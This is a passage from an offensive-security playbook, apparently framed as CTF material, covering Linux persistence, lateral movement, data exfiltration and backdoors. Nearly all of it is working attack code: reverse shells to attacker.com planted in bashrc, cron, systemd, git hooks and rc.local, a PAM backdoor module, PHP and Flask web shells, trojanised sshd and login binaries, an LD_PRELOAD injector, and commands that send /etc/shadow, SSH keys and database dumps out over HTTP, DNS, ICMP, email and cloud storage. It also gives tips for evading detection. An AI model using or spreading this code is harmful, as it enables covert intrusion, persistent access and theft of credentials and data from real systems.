chmod +x /etc/cron.hourly/update-check
```

### SSH-Based Persistence

**Authorized Keys Modification**

```bash
# Generate SSH key pair on attacker machine
ssh-keygen -t ed25519 -f ~/.ssh/ctf_persist -N ""

# Add public key to target
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExamplePublicKey attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root persistence (if root access)
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExamplePublicKey attacker@kali" >> /root/.ssh/authorized_keys

# Multi-user persistence
for user_home in /home/*; do
    mkdir -p "$user_home/.ssh"
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExamplePublicKey attacker@kali" >> "$user_home/.ssh/authorized_keys"
    chmod 600 "$user_home/.ssh/authorized_keys"
done
```

**SSH Configuration Manipulation**

```bash
# Allow password authentication (if disabled)
sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

# Allow root login
sed -i 's/^PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
systemctl restart sshd

# Add authorized keys command for backdoor
echo "AuthorizedKeysCommand /usr/local/bin/auth-keys-fetch" >> /etc/ssh/sshd_config
echo "AuthorizedKeysCommandUser nobody" >> /etc/ssh/sshd_config

cat > /usr/local/bin/auth-keys-fetch << 'EOF'
#!/bin/bash
curl -s http://attacker.com/authorized_keys
cat /home/$1/.ssh/authorized_keys 2>/dev/null
EOF
chmod +x /usr/local/bin/auth-keys-fetch
```

### Shell Configuration Persistence

**Bashrc/Profile Modification**

```bash
# User-level persistence
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bash_profile

# System-wide persistence
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> /etc/bash.bashrc
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> /etc/profile

# Profile.d script
cat > /etc/profile.d/system-update.sh << 'EOF'
#!/bin/bash
if [ "$UID" -eq 0 ]; then
    nohup bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &>/dev/null &
fi
EOF
chmod +x /etc/profile.d/system-update.sh
```

**Shell Alias Persistence**

```bash
# Backdoor common commands
echo "alias ls='ls \$@ && (bash -i >& /dev/tcp/attacker.com/4444 0>&1 &)'" >> ~/.bashrc
echo "alias sudo='bash -i >& /dev/tcp/attacker.com/4444 0>&1 & && sudo'" >> ~/.bashrc
```

### PAM Backdoor Persistence

[Inference] PAM backdoors intercept authentication attempts; implementation requires careful modification:

```bash
# Compile PAM backdoor module
cat > pam_backdoor.c << 'EOF'
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password;
    
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if (strcmp(password, "SecretBackdoorPass123") == 0) {
        return PAM_SUCCESS;
    }
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF

# Compile module
gcc -fPIC -c pam_backdoor.c
gcc -shared -o pam_backdoor.so pam_backdoor.o -lpam

# Install module
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Add to PAM configuration
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/common-auth
```

### Web Shell Persistence

**PHP Web Shell**

```bash
# Simple PHP shell
cat > /var/www/html/.system-config.php << 'EOF'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF

# More sophisticated shell with password
cat > /var/www/html/admin/config.php << 'EOF'
<?php
if (md5($_GET['auth']) === 'cd73502828457d15655bbd7a63fb0bc8') {
    if (isset($_GET['cmd'])) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
}
?>
EOF

# Reverse shell web trigger
cat > /var/www/html/.favicon.ico.php << 'EOF'
<?php
if ($_GET['trigger'] == 'activate') {
    $sock = fsockopen("attacker.com", 4444);
    exec("/bin/bash -i <&3 >&3 2>&3");
}
?>
EOF
```

**Python Web Shell**

```bash
# Flask-based shell
cat > /opt/webapp/shell.py << 'EOF'
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/api/health')
def health():
    if request.args.get('check') == 'full':
        cmd = request.args.get('cmd', 'whoami')
        return subprocess.check_output(cmd, shell=True)
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
EOF
```

### SUID Binary Persistence

```bash
# Create SUID shell
cp /bin/bash /tmp/.system-cache
chmod 4755 /tmp/.system-cache
chown root:root /tmp/.system-cache

# Execute as low-privilege user
/tmp/.system-cache -p

# Hidden SUID in common location
cp /bin/bash /usr/lib/systemd/.system-generator
chmod 4755 /usr/lib/systemd/.system-generator
```

### Startup Script Persistence

**RC.local**

```bash
# Add to rc.local (older systems)
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> /etc/rc.local
chmod +x /etc/rc.local
```

**Init.d Scripts**

```bash
# Create init.d service
cat > /etc/init.d/system-health << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-health
# Required-Start:    $network
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      
# Short-Description: System Health Monitor
### END INIT INFO

case "$1" in
    start)
        bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
        ;;
    stop)
        ;;
    restart)
        ;;
esac
EOF

chmod +x /etc/init.d/system-health
update-rc.d system-health defaults
```

### Git Hook Persistence

```bash
# Post-commit hook
cat > /path/to/repo/.git/hooks/post-commit << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
EOF
chmod +x /path/to/repo/.git/hooks/post-commit

# Pre-push hook
cat > /path/to/repo/.git/hooks/pre-push << 'EOF'
#!/bin/bash
curl -s http://attacker.com/payload.sh | bash &
exit 0
EOF
chmod +x /path/to/repo/.git/hooks/pre-push
```

### Container Persistence

**Docker Container Escape Persistence**

```bash
# Host cron from container (if privileged or mounted)
echo "*/10 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /hostfs/etc/crontab

# Modify host systemd from container
cat > /hostfs/etc/systemd/system/container-monitor.service << 'EOF'
[Unit]
Description=Container Monitor
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF

nsenter -t 1 -m -u -n -i systemctl daemon-reload
nsenter -t 1 -m -u -n -i systemctl enable container-monitor.service
```

### Kernel Module Persistence

[Unverified] Kernel module persistence requires specific kernel headers and can be detected by security tools:

```bash
# Basic rootkit module template
cat > rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init rootkit_init(void) {
    // Persistence logic here
    return 0;
}

static void __exit rootkit_exit(void) {
    // Cleanup
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# Compile and load
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod rootkit.ko
echo "rootkit" >> /etc/modules
```

## Lateral Movement

Lateral movement expands access from compromised systems to additional targets within the network using harvested credentials and discovered vulnerabilities.

### Credential-Based Movement

**SSH Lateral Movement**

```bash
# Test harvested credentials across multiple hosts
while read host; do
    while read user; do
        sshpass -p 'password123' ssh -o StrictHostKeyChecking=no "$user@$host" 'whoami' 2>/dev/null && \
        echo "[+] Success: $user@$host"
    done < users.txt
done < hosts.txt

# SSH key-based movement
while read host; do
    ssh -i id_rsa -o StrictHostKeyChecking=no user@$host 'whoami' 2>/dev/null && \
    echo "[+] Key works on: $host"
done < hosts.txt

# SSH tunneling for pivot
ssh -D 9050 -f -N user@compromised_host
proxychains nmap -sT 192.168.10.0/24
```

**Pass-the-Hash (Linux)**

```bash
# Using pth-toolkit for SMB/RDP
pth-winexe -U 'DOMAIN/user%hash' //target.host cmd.exe

# Using evil-winrm with hash
evil-winrm -i target.host -u user -H 'NTLM_HASH'

# Using crackmapexec
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb 192.168.1.0/24 -u admin -H 'NTLM_HASH' --local-auth
crackmapexec winrm 192.168.1.0/24 -u admin -p 'password'
```

**Kerberos Ticket Movement**

```bash
# Extract Kerberos tickets (if available)
klist
cp /tmp/krb5cc_* /tmp/stolen_ticket

# Use stolen ticket
export KRB5CCNAME=/tmp/stolen_ticket
klist
kinit -k -t /etc/krb5.keytab user@DOMAIN

# Impacket tools with Kerberos
getTGT.py domain.local/user:password
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain.local/admin@target.host
```

### Network Tunneling and Pivoting

**SSH Tunneling**

```bash
# Local port forward (access remote service locally)
ssh -L 8080:internal-server:80 user@pivot-host

# Remote port forward (expose local service to remote)
ssh -R 4444:localhost:4444 user@pivot-host

# Dynamic SOCKS proxy
ssh -D 9050 -f -N user@pivot-host
# Use with proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn internal-target

# SSH jump host
ssh -J user@pivot-host user@internal-target
ssh -J user@pivot1,user@pivot2 user@final-target
```

**Chisel Tunneling**

```bash
# On attacker machine (server mode)
chisel server --port 8000 --reverse

# On compromised host (client mode)
chisel client attacker-ip:8000 R:socks

# Access internal network through SOCKS proxy
proxychains nmap -sT 10.10.10.0/24

# Port forward through chisel
chisel client attacker-ip:8000 R:3389:internal-dc:3389
rdesktop localhost:3389
```

**Socat Relays**

```bash
# TCP relay/port forward
socat TCP-LISTEN:8080,fork TCP:internal-host:80

# Reverse shell relay
# On pivot host
socat TCP-LISTEN:4444,fork TCP:attacker-ip:4444

# From compromised internal host
bash -i >& /dev/tcp/pivot-host/4444 0>&1

# Encrypted tunnel
# Generate certificate
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem

# On attacker
socat OPENSSL-LISTEN:4443,cert=cert.pem,verify=0,fork STDOUT

# On target
socat EXEC:/bin/bash OPENSSL:attacker-ip:4443,verify=0
```

**Metasploit Pivoting**

```bash
# Add route through session
meterpreter > run autoroute -s 10.10.10.0/24
# Or from msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 <session_id>

# Start SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > set SRVPORT 9050
msf6 auxiliary(socks_proxy) > run -j

# Port forward
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.50
```

**Network Namespace Pivoting**

```bash
# Create network namespace
ip netns add pivot_ns

# Move interface to namespace
ip link set veth0 netns pivot_ns

# Execute commands in namespace
ip netns exec pivot_ns bash
ip netns exec pivot_ns nmap -sT 10.10.10.0/24
```

### Service Exploitation Movement

**SMB Relay Attacks**

```bash
# Responder with SMB disabled
responder -I eth0 -d -w

# ntlmrelayx to relay to targets
ntlmrelayx.py -tf targets.txt -smb2support

# Relay with command execution
ntlmrelayx.py -t smb://target-host -c "whoami"

# Relay with SOCKS proxy
ntlmrelayx.py -tf targets.txt -socks
```

**WinRM Movement**

```bash
# Using evil-winrm
evil-winrm -i target-host -u administrator -p 'password'

# Credential spray across hosts
while read host; do
    evil-winrm -i "$host" -u admin -p 'password' -e 'whoami' 2>/dev/null && \
    echo "[+] Success: $host"
done < hosts.txt

# Using crackmapexec
crackmapexec winrm 192.168.1.0/24 -u admin -p 'password' -x 'whoami'
```

**RDP Movement**

```bash
# RDP with xfreerdp
xfreerdp /u:administrator /p:'password' /v:target-host /cert-ignore

# RDP credential spray
while read host; do
    xfreerdp /u:admin /p:'password' /v:"$host" /cert-ignore +auth-only 2>&1 | \
    grep -q "Authentication only" && echo "[+] Valid: $host"
done < hosts.txt

# RDP through SOCKS proxy
proxychains xfreerdp /u:administrator /p:'password' /v:internal-host
```

**Psexec Movement**

```bash
# Impacket psexec
psexec.py domain/user:'password'@target-host

# Multiple target execution
while read host; do
    psexec.py domain/user:'password'@"$host" 'whoami'
done < hosts.txt

# Using hash instead of password
psexec.py -hashes :NTLM_HASH domain/user@target-host
```

**WMI Movement**

```bash
# Impacket wmiexec
wmiexec.py domain/user:'password'@target-host

# WMI command execution
wmiexec.py domain/user:'password'@target-host 'ipconfig'

# Using hash
wmiexec.py -hashes :NTLM_HASH domain/user@target-host
```

### Container and Cloud Movement

**Docker Socket Exploitation**

```bash
# Find Docker socket
find / -name docker.sock 2>/dev/null

# Access host filesystem via container
docker run -v /:/hostfs -it alpine chroot /hostfs bash

# Create privileged container for pivot
docker run --privileged -v /:/hostfs -it alpine ash

# Extract credentials from other containers
docker ps -q | while read container; do
    docker exec "$container" env | grep -iE "(pass|key|token|secret)"
done
```

**Kubernetes Lateral Movement**

```bash
# Service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# List pods in other namespaces
curl -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods"

# Execute in other pods
kubectl exec -it pod-name -n namespace -- /bin/bash

# Port forward to internal services
kubectl port-forward svc/internal-service 8080:80 -n namespace
```

**AWS Metadata Service Movement**

```bash
# Extract IAM credentials from metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Assume role for lateral movement
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name test

# List accessible resources in account
aws ec2 describe-instances
aws s3 ls
aws lambda list-functions
```

### Network Service Exploitation

**NFS Share Movement**

```bash
# Discover NFS shares
showmount -e target-host

# Mount NFS share
mkdir /mnt/nfs_share
mount -t nfs target-host:/share /mnt/nfs_share

# Access files as different UID (if no_root_squash)
# On attacker machine
useradd -u 1001 targetuser
su - targetuser
# Now access mounted share with target user's permissions
```

**SNMP Community String Exploitation**

```bash
# Enumerate with discovered community string
snmpwalk -v 2c -c public target-host

# Extract running processes
snmpwalk -v 2c -c public target-host hrSWRunName

# Modify configuration (if write access)
snmpset -v 2c -c private target-host OID value
```

## Data Exfiltration

Data exfiltration techniques extract sensitive information from compromised systems while evading detection and network controls.

### HTTP/HTTPS Exfiltration

**Simple HTTP POST**

```bash
# Exfiltrate file via POST
curl -X POST -F "file=@/etc/shadow" http://attacker.com/upload

# Exfiltrate multiple files
tar czf - /home/user/.ssh | curl -X POST -d @- http://attacker.com/data

# Base64 encode before exfiltration
cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com/data

# Chunked exfiltration for large files
split -b 1M sensitive_data.zip chunk_
for chunk in chunk_*; do
    curl -X POST -F "file=@$chunk" http://attacker.com/upload
    sleep 5
done
```

**HTTPS with Authentication**

```bash
# HTTPS POST with authentication
curl -k -X POST -H "Authorization: Bearer SECRET_TOKEN" \
    -F "file=@database_dump.sql" https://attacker.com/secure/upload

# Web shell upload via PUT
curl -k -X PUT -T shell.php https://target.com/uploads/config.php
```

**HTTP Headers Exfiltration**

```bash
# Data in User-Agent header
curl -A "$(cat /etc/passwd | base64 | tr -d '\n')" http://attacker.com/

# Data in custom headers
curl -H "X-Data: $(cat sensitive.txt | base64)" http://attacker.com/

# Cookie-based exfiltration
curl -b "data=$(cat file.txt | base64)" http://attacker.com/
```

### DNS Exfiltration

**Basic DNS Exfiltration**

```bash
# Exfiltrate via DNS queries
cat sensitive.txt | xxd -p | while read line; do
    dig "$line.attacker.com" @attacker-dns-server
    sleep 1
done

# Base32 encoding for DNS compatibility
cat /etc/passwd | base32 | tr -d '=' | fold -w 63 | while read line; do
    dig "$line.exfil.attacker.com"
done

# Automated DNS exfiltration script
cat > dns_exfil.sh << 'EOF'
#!/bin/bash
FILE="$1"
DOMAIN="attacker.com"
ID=$(date +%s)

cat "$FILE" | base32 | tr -d '=' | fold -w 60 | nl -v 1 | while read num data; do
    dig "$ID.$num.$data.$DOMAIN" +short
done
EOF
chmod +x dns_exfil.sh
./dns_exfil.sh /etc/shadow
```

**DNS TXT Record Exfiltration**

```bash
# Exfiltrate via TXT queries
cat database.sql | gzip | base64 | fold -w 200 | while read line; do
    dig TXT "$line.exfil.attacker.com"
done
```

### ICMP Exfiltration

```bash
# ICMP ping data exfiltration
cat sensitive.txt | xxd -p -c 16 | while read data; do
    ping -c 1 -p "$data" attacker-host
done

# Using hping3 for ICMP exfiltration
cat file.txt | base64 | fold -w 32 | while read data; do
    hping3 -1 -e "$data" attacker-host -c 1
done

# ICMP data payload script
cat > icmp_exfil.sh << 'EOF'
#!/bin/bash
TARGET="attacker-host"
FILE="$1"

cat "$FILE" | while IFS= read -r line; do
    echo "$line" | xxd -p | while read hex; do
        ping -c 1 -p "$hex" "$TARGET"
    done
done
EOF
```

### TCP/UDP Exfiltration

**Netcat Exfiltration**

```bash
# Simple TCP exfiltration
# On attacker
nc -lvnp 4444 > received_data.tar.gz

# On target
tar czf - /home/user/sensitive | nc attacker-ip 4444

# UDP exfiltration
# On attacker
nc -ulvnp 53 > received_data.txt

# On target
cat sensitive.txt | nc -u attacker-ip 53
```

**Encrypted TCP Exfiltration**

```bash
# Using OpenSSL for encrypted transfer
# On attacker
openssl s_server -quiet -key server.key -cert server.crt -port 4443 > received_file

# On target
tar czf - /opt/sensitive | openssl s_client -quiet -connect attacker-ip:4443
```

**Reverse Shell Exfiltration**

```bash
# Exfiltrate through existing reverse shell
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
# Then from shell
cat /etc/shadow | base64
```

### Cloud Storage Exfiltration

**AWS S3 Exfiltration**

```bash
# Upload to attacker-controlled S3 bucket
aws s3 cp database_dump.sql s3://attacker-bucket/exfil/$(hostname)/

# Recursive directory upload
aws s3 sync /home/user/documents s3://attacker-bucket/exfil/$(hostname)/

# Using presigned URLs
aws s3 presign s3://attacker-bucket/upload/data.zip --expires-in 3600
curl -X PUT -T sensitive.tar.gz "PRESIGNED_URL"
```

**Azure Blob Storage Exfiltration**

```bash
# Upload to Azure blob
az storage blob upload --account-name attackerstorage --container-name exfil \
    --name "$(hostname)_$(date +%s).tar.gz" --file data.tar.gz

# Using SAS token
curl -X PUT -H "x-ms-blob-type: BlockBlob" \
    -T sensitive.txt "https://attackerstorage.blob.core.windows.net/exfil/data.txt?SAS_TOKEN"
```

**Google Cloud Storage Exfiltration**

```bash
# Upload to GCS bucket
gsutil cp -r /home/user/sensitive gs://attacker-bucket/exfil/$(hostname)/

# Using signed URL
curl -X PUT -T database.sql "SIGNED_URL"
```

### Steganography Exfiltration

```bash
# Hide data in image file
steghide embed -cf image.jpg -ef sensitive.txt -p password
curl -X POST -F "image=@image.jpg" http://attacker.com/upload/photo

# Extract data from image
steghide extract -sf image.jpg -p password

# Using LSB steganography
cat sensitive.txt | xxd -p | python3 -c "
import sys
from PIL import Image
data = sys.stdin.read().strip()
img = Image.open('cover.png')
# LSB encoding logic here
img.save('stego.png')
"
```

### Protocol Tunneling Exfiltration

**SSH Tunnel Exfiltration**

```bash
# Forward exfiltration through SSH tunnel
ssh -R 9999:localhost:9999 user@attacker-host
# On target
tar czf - /sensitive | nc localhost 9999

# On attacker (listening on port 9999)
nc -lvnp 9999 > exfiltrated_data.tar.gz
```

**HTTP Tunnel Exfiltration**

```bash
# Using httptunnel
# On attacker
hts -F localhost:4444 8080

# On target
htc -F 4444 attacker-ip:8080
tar czf - /sensitive | nc localhost 4444

# Using chisel for HTTP tunneling
# On attacker
chisel server --port 8000 --reverse

# On target
chisel client attacker-ip:8000 R:4444:localhost:4444
tar czf - /data | nc localhost 4444
```

**DNS Tunneling Tools**

```bash
# Using dnscat2
# On attacker
dnscat2 --dns server=attacker.com

# On target
./dnscat attacker.com
# Then within dnscat session
download /etc/shadow
upload payload.sh /tmp/

# Using iodine for DNS tunnel
# On attacker (requires DNS server control)
iodined -f 10.0.0.1 exfil.attacker.com

# On target
iodine -f attacker-dns-server exfil.attacker.com
# Creates tunnel interface, use for data transfer
scp -o ProxyCommand="nc -X connect -x 10.0.0.1:1080 %h %p" file.txt user@attacker-internal-ip:/tmp/
```

### Email Exfiltration

```bash
# SMTP exfiltration
tar czf - /sensitive | base64 | mail -s "System Backup $(date)" attacker@example.com

# Using sendmail
cat > email_exfil.sh << 'EOF'
#!/bin/bash
FILE="$1"
TO="attacker@example.com"
SUBJECT="Data Package $(date +%s)"

(
echo "To: $TO"
echo "Subject: $SUBJECT"
echo "Content-Type: text/plain"
echo ""
base64 "$FILE"
) | sendmail -t
EOF

# Multiple file email exfiltration
for file in /home/user/sensitive/*; do
    uuencode "$file" "$(basename $file)" | mail -s "File: $(basename $file)" attacker@example.com
    sleep 60
done
```

### FTP/SFTP Exfiltration

```bash
# Anonymous FTP upload
curl -T sensitive.tar.gz ftp://attacker-ftp-server/ --user anonymous:

# Authenticated FTP
curl -T database.sql ftp://attacker-ftp-server/uploads/ --user username:password

# SFTP exfiltration
sftp attacker-user@attacker-host << EOF
cd /incoming
put /etc/shadow
put /home/user/.ssh/id_rsa
bye
EOF

# Batch SFTP upload
cat > sftp_batch.txt << 'EOF'
cd /exfil
put /etc/passwd
put /etc/shadow
put /root/.ssh/id_rsa
bye
EOF
sftp -b sftp_batch.txt user@attacker-host
```

### Database Exfiltration

**Direct Database Dumps**

```bash
# MySQL dump and exfiltrate
mysqldump -u root -p'password' --all-databases | gzip | base64 | curl -X POST -d @- http://attacker.com/db

# PostgreSQL dump
pg_dumpall -U postgres | gzip | curl -X POST -F "file=@-" http://attacker.com/upload

# MongoDB dump
mongodump --out=/tmp/mongo_backup
tar czf - /tmp/mongo_backup | curl -X POST -d @- http://attacker.com/mongo

# SQLite database exfiltration
for db in $(find / -name "*.db" 2>/dev/null); do
    curl -X POST -F "file=@$db" -F "path=$db" http://attacker.com/sqlite
done
```

**Database Query Exfiltration**

```bash
# Extract specific tables via SQL queries
mysql -u root -p'password' -e "SELECT * FROM users.credentials" | \
    base64 | curl -X POST -d @- http://attacker.com/data

# PostgreSQL with output to file
psql -U postgres -c "COPY (SELECT * FROM sensitive_table) TO STDOUT CSV" | \
    curl -X POST -F "file=@-" http://attacker.com/upload
```

### Git Repository Exfiltration

```bash
# Clone entire repository
cd /tmp
git clone --mirror /var/www/application/.git
tar czf repo.tar.gz application.git
curl -X POST -F "file=@repo.tar.gz" http://attacker.com/repos

# Extract git history with secrets
cd /path/to/repo
git log --all --full-history --pretty=format:"%H" | while read commit; do
    git show $commit | grep -iE "(password|key|token|secret)" > /tmp/secrets_$commit.txt
done
tar czf - /tmp/secrets_*.txt | curl -X POST -d @- http://attacker.com/git-secrets

# Dump git configuration
cat .git/config | curl -X POST -d @- http://attacker.com/git-config
```

### Archive and Compression for Exfiltration

```bash
# Create encrypted archive
tar czf - /sensitive | openssl enc -aes-256-cbc -salt -k "password" > encrypted.tar.gz.enc
curl -X POST -F "file=@encrypted.tar.gz.enc" http://attacker.com/secure

# Split large files for exfiltration
tar czf - /large/dataset | split -b 10M - chunk_
for chunk in chunk_*; do
    curl -X POST -F "file=@$chunk" http://attacker.com/chunks/$(hostname)/
    rm $chunk
    sleep 30
done

# Password-protected ZIP
zip -e -r sensitive.zip /home/user/documents
# Enter password when prompted
curl -X POST -F "file=@sensitive.zip" http://attacker.com/zips
```

### Living off the Land Exfiltration

```bash
# Using curl (commonly available)
cat /etc/shadow | curl -X POST -d @- http://attacker.com/data

# Using wget
tar czf - /sensitive | wget --post-file=- http://attacker.com/upload -O -

# Using Python (if available)
python3 -c "import requests; requests.post('http://attacker.com/upload', files={'file': open('/etc/passwd', 'rb')})"

# Using Perl
perl -MHTTP::Request::Common -MLWP::UserAgent -e \
    'LWP::UserAgent->new->request(POST "http://attacker.com/upload", Content_Type => "form-data", Content => [file => ["/etc/shadow"]])'

# Using Ruby
ruby -rnet/http -e 'Net::HTTP.post_form(URI("http://attacker.com/upload"), {"data" => File.read("/etc/passwd")})'
```

### Slow Exfiltration (Evading Rate Limits)

```bash
# Time-delayed exfiltration
cat sensitive.txt | base64 | fold -w 100 | while read line; do
    curl -X POST -d "data=$line" http://attacker.com/slow
    sleep $((60 + RANDOM % 120))  # Random delay 60-180 seconds
done

# Scheduled exfiltration via cron
cat > /tmp/slow_exfil.sh << 'EOF'
#!/bin/bash
FILE="/etc/shadow"
CHUNK_SIZE=1000
POSITION=$(cat /tmp/exfil_position 2>/dev/null || echo 0)

DATA=$(tail -c +$POSITION "$FILE" | head -c $CHUNK_SIZE | base64)
if [ -n "$DATA" ]; then
    curl -X POST -d "data=$DATA&pos=$POSITION" http://attacker.com/incremental
    echo $((POSITION + CHUNK_SIZE)) > /tmp/exfil_position
fi
EOF
chmod +x /tmp/slow_exfil.sh
(crontab -l; echo "*/30 * * * * /tmp/slow_exfil.sh") | crontab -
```

## Backdoor Creation

Backdoors provide alternative access mechanisms independent of the original compromise vector, ensuring access persistence even if initial vulnerabilities are patched.

### Binary Backdoors

**Backdoored System Binaries**

```bash
# Backdoor SSH binary
cp /usr/sbin/sshd /usr/sbin/sshd.bak

cat > sshd_wrapper.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char *password = getenv("SSH_PASSWORD");
    
    if (password && strcmp(password, "BackdoorPass123") == 0) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", "-i", NULL);
        exit(0);
    }
    
    execv("/usr/sbin/sshd.bak", argv);
    return 0;
}
EOF

gcc -o /usr/sbin/sshd sshd_wrapper.c
chmod +x /usr/sbin/sshd

# Access: SSH_PASSWORD=BackdoorPass123 ssh user@target
```

**Backdoored Login Binary**

```bash
# Intercept login credentials
cp /bin/login /bin/login.bak

cat > login_wrapper.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    // Log credentials before passing to real login
    FILE *fp = fopen("/var/log/.credentials", "a");
    if (fp) {
        fprintf(fp, "User: %s, Time: %ld\n", getenv("USER"), time(NULL));
        fclose(fp);
    }
    
    // Check for backdoor password
    char *pass = getenv("PASSWORD");
    if (pass && strcmp(pass, "MasterKey123") == 0) {
        setuid(0);
        execl("/bin/bash", "bash", NULL);
    }
    
    execv("/bin/login.bak", argv);
    return 0;
}
EOF

gcc -o /bin/login login_wrapper.c
```

**Shared Library Injection**

```bash
# Create malicious shared library
cat > evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    if (getuid() == 0) {
        system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &");
    }
}
EOF

gcc -shared -fPIC -o evil.so evil.c

# Inject via LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload

# Or inject via LD_LIBRARY_PATH in service
echo 'Environment="LD_PRELOAD=/tmp/evil.so"' >> /etc/systemd/system/some-service.service
```

### Network Service Backdoors

**Bind Shell Backdoor**

```bash
# Simple bind shell
cat > bind_shell.sh << 'EOF'
#!/bin/bash
while true; do
    nc -lvnp 12345 -e /bin/bash
    sleep 5
done
EOF
chmod +x bind_shell.sh
nohup /tmp/bind_shell.sh &

# Using socat for encrypted bind shell
socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork EXEC:/bin/bash &

# Python bind shell
python3 -c "
import socket,subprocess,os
s=socket.socket()
s.bind(('0.0.0.0',12345))
s.listen(1)
while True:
    c,a=s.accept()
    os.dup2(c.fileno(),0)
    os.dup2(c.fileno(),1)
    os.dup2(c.fileno(),2)
    subprocess.call(['/bin/bash','-i'])
" &
```

**Reverse Shell Backdoor**

```bash
# Persistent reverse shell service
cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=120
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 300; done'

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable system-health.service
systemctl start system-health.service

# Cron-based reverse shell
(crontab -l; echo "*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
```

**Port Knocking Backdoor**

```bash
# Install knockd
apt-get install knockd -y

# Configure port knock sequence
cat > /etc/knockd.conf << 'EOF'
[options]
    UseSyslog

[openSSH]
    sequence    = 7000,8000,9000
    seq_timeout = 10
    command     = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[closeSSH]
    sequence    = 9000,8000,7000
    seq_timeout = 10
    command     = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[backdoor]
    sequence    = 1337,31337,8080
    seq_timeout = 15
    command     = /bin/bash -c 'bash -i >& /dev/tcp/%IP%/4444 0>&1' &
    tcpflags    = syn
EOF

# Start knockd
systemctl enable knockd
systemctl start knockd

# Activate from attacker: knock target 1337 31337 8080
```

### Web-Based Backdoors

**PHP Backdoor with Authentication**

```bash
cat > /var/www/html/includes/config.php.bak << 'EOF'
<?php
// Legitimate-looking config file
define('DB_HOST', 'localhost');
define('DB_USER', 'webapp');
define('DB_PASS', 'password');

// Backdoor functionality
if (isset($_SERVER['HTTP_X_AUTH_TOKEN']) && 
